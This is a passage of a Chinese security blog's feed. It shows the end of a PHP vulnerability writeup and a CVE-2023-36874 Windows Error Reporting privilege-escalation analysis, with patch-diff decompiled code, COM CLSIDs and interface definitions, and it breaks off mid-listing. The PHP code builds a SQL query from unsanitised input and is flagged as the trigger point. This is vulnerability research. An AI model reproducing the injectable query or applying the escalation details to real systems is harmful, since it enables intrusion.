&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> ($cmd &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;createUser&amp;#34;&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 从请求中获取json数据并decode
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $POST_JSON &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">json_decode&lt;/span>($HTTP_RAW_POST_DATA, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $account &lt;span style="color:#f92672">=&lt;/span> $POST_JSON[&lt;span style="color:#e6db74">&amp;#39;account&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这里要保证请求的json数据里面有account
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($account) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#66d9ef">empty&lt;/span>($account)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write_log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;{&amp;#39;createUser&amp;#39;:&amp;#39;用户账户不可为空&amp;#39;}&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exitErrorJson&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;用户账号不可为空&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $account &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">utf8ToGbk&lt;/span>($account);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这里要保证请求的json数据里面有userPwd
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $userPwd &lt;span style="color:#f92672">=&lt;/span> $POST_JSON[&lt;span style="color:#e6db74">&amp;#39;userPwd&amp;#39;&lt;/span>];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">isset&lt;/span>($userPwd) &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#66d9ef">empty&lt;/span>($userPwd)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">write_log&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;{&amp;#39;createUser&amp;#39;:&amp;#39;用户密码不可为空&amp;#39;}&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">exitErrorJson&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;用户密码不可为空&amp;#39;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">//账号是否已存在 触发漏洞
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">mysql_query&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;select * from cuser where name=&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $account &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>, $DSCon);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>Created at 2023-09-20T10:04:31+08:00&lt;/strong>&lt;/p></description></item><item><title>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</link><pubDate>Tue, 19 Sep 2023 10:26:14 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</guid><description>&lt;h3 id="基本信息">基本信息&lt;/h3>
&lt;p>Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。&lt;/p>
&lt;h3 id="影响版本">影响版本&lt;/h3>
&lt;p>略&lt;/p>
&lt;h3 id="环境搭建">环境搭建&lt;/h3>
&lt;ul>
&lt;li>Windows 10 21H2 6月补丁&lt;/li>
&lt;/ul>
&lt;h3 id="技术分析调试">技术分析&amp;amp;调试&lt;/h3>
&lt;p>&lt;strong>补丁对比&lt;/strong>
diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230826175253.png" />&lt;/p>
&lt;p>对比发现补丁直接阻断了后续&lt;code>CAutoImpersonate::ImpersonateUserHighestPrivs&lt;/code>和&lt;code>CWerComReport::_SubmitReport&lt;/code>的调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//未修复
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">SubmitReport&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CWerComReport &lt;span style="color:#f92672">*&lt;/span>this,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a3,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> IWerReportSubmitCallback &lt;span style="color:#f92672">*&lt;/span>a4,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a5,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a6)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> v10; &lt;span style="color:#75715e">// ebx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v12; &lt;span style="color:#75715e">// [rsp+30h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v13; &lt;span style="color:#75715e">// [rsp+38h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>CAutoImpersonate&lt;span style="color:#f92672">::&lt;/span>g_bEnableImpersonate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v10 &lt;span style="color:#f92672">=&lt;/span> CAutoImpersonate&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">ImpersonateUserHighestPrivs&lt;/span>((CAutoImpersonate &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12), v10 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v10 &lt;span style="color:#f92672">=&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">_SubmitReport&lt;/span>((CWerComReport &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)this &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>), a2, a3, a4, a5, a6);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CAutoImpersonate&lt;span style="color:#f92672">::~&lt;/span>&lt;span style="color:#a6e22e">CAutoImpersonate&lt;/span>((CAutoImpersonate &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v10;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 修复代码
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">SubmitReport&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CWerComReport &lt;span style="color:#f92672">*&lt;/span>this,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a2,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> a3,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">struct&lt;/span> IWerReportSubmitCallback &lt;span style="color:#f92672">*&lt;/span>a4,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int16&lt;/span> &lt;span style="color:#f92672">**&lt;/span>a5,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#f92672">*&lt;/span>a6)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> v11; &lt;span style="color:#75715e">// ebx
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v12; &lt;span style="color:#75715e">// [rsp+30h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v13; &lt;span style="color:#75715e">// [rsp+38h] [rbp-10h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v13 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int8&lt;/span>)wil&lt;span style="color:#f92672">::&lt;/span>details&lt;span style="color:#f92672">::&lt;/span>FeatureImpl&lt;span style="color:#f92672">&amp;lt;&lt;/span>__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&lt;span style="color:#f92672">&amp;gt;::&lt;/span>&lt;span style="color:#a6e22e">__private_IsEnabled&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>wil&lt;span style="color:#f92672">::&lt;/span>Feature&lt;span style="color:#f92672">&amp;lt;&lt;/span>__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport&lt;span style="color:#f92672">&amp;gt;::&lt;/span>GetImpl&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">`&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>&lt;span style="color:#f92672">::&lt;/span>impl) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0x80004001&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v12 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">!&lt;/span>CAutoImpersonate&lt;span style="color:#f92672">::&lt;/span>g_bEnableImpersonate
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">||&lt;/span> (v11 &lt;span style="color:#f92672">=&lt;/span> CAutoImpersonate&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">ImpersonateUserHighestPrivs&lt;/span>((CAutoImpersonate &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12), v11 &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> CWerComReport&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#a6e22e">_SubmitReport&lt;/span>((CWerComReport &lt;span style="color:#f92672">*&lt;/span>)((&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)this &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span>), a2, a3, a4, a5, a6);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> CAutoImpersonate&lt;span style="color:#f92672">::~&lt;/span>&lt;span style="color:#a6e22e">CAutoImpersonate&lt;/span>((CAutoImpersonate &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#f92672">&amp;amp;&lt;/span>v12);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>)v11;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>根据函数名&lt;code>CAutoImpersonate::ImpersonateUserHighestPrivs&lt;/code>可知，该函数为模拟用户最高的权限并提交report&lt;/p>
&lt;p>&lt;strong>动态调试&lt;/strong>&lt;/p>
&lt;p>开启&lt;code>Problem Reports Control Panel Support&lt;/code>服务，对应路径为&lt;code>C:\Windows\System32\svchost.exe -k netsvcs -p&lt;/code>。
使用oleviewdotnet查询&lt;code>Problem Reports Control Panel Support&lt;/code>服务对应的ole信息&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230826185534.png" />&lt;/p>
&lt;p>
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230826185718.png" />&lt;/p>
&lt;p>对应的COM接口的CLSID为&lt;/p>
&lt;ul>
&lt;li>CLSID: 0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB&lt;/li>
&lt;li>AppID: 136A0DC7-DF5C-4271-A2AC-15DF1A1323F2
&lt;img alt="" src="https://www.ch35tnut.site/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230911181821.png" />
查看这个COM的接口信息&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c++" data-lang="c++">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">__declspec&lt;/span>(uuid(&lt;span style="color:#e6db74">&amp;#34;6620c14b-70ae-4d4e-a4f6-91a7dcc582c2&amp;#34;&lt;/span>)) IErcLuaSupport : &lt;span style="color:#66d9ef">public&lt;/span> IUnknown {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc3(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerStoreFactory&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">__declspec&lt;/span>(uuid(&lt;span style="color:#e6db74">&amp;#34;4904c154-426f-4c88-8ec2-4543d18670f7&amp;#34;&lt;/span>)) IWerStoreFactory : &lt;span style="color:#66d9ef">public&lt;/span> IUnknown {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc3(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerStore&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc4(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerStore&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">__declspec&lt;/span>(uuid(&lt;span style="color:#e6db74">&amp;#34;1e3a0e4f-1412-444f-8a94-fc6a09cd4195&amp;#34;&lt;/span>)) IWerStore : &lt;span style="color:#66d9ef">public&lt;/span> IUnknown {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc3();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc4(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc5(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc6(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR p0, &lt;span style="color:#75715e">/* Stack Offset: 16 */&lt;/span> IWerReport&lt;span style="color:#f92672">**&lt;/span> p1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc7(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR p0, &lt;span style="color:#75715e">/* Stack Offset: 16 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">__declspec&lt;/span>(uuid(&lt;span style="color:#e6db74">&amp;#34;d01b8f28-0bd1-4652-a415-8229f5ee506c&amp;#34;&lt;/span>)) IWerReport : &lt;span style="color:#66d9ef">public&lt;/span> IUnknown {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc3(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc4(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc5(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc6(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerKeyValueList&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc7(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerKeyValueList&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc8(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerStringList&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc9(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc10(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc11(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc12(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> BSTR&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc13(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerStringList&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc14(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> IWerStringList&lt;span style="color:#f92672">**&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc15(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc16(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">Struct_1&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc17(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">virtual&lt;/span> HRESULT &lt;span style="color:#66d9ef">__stdcall&lt;/span> Proc18(&lt;span style="color:#75715e">/* Stack Offset: 8 */&lt;/span> &lt;span style="color:#66d9ef">int64_t&lt;/span>&lt;span style="color:#f92672">*&lt;/span> p0);
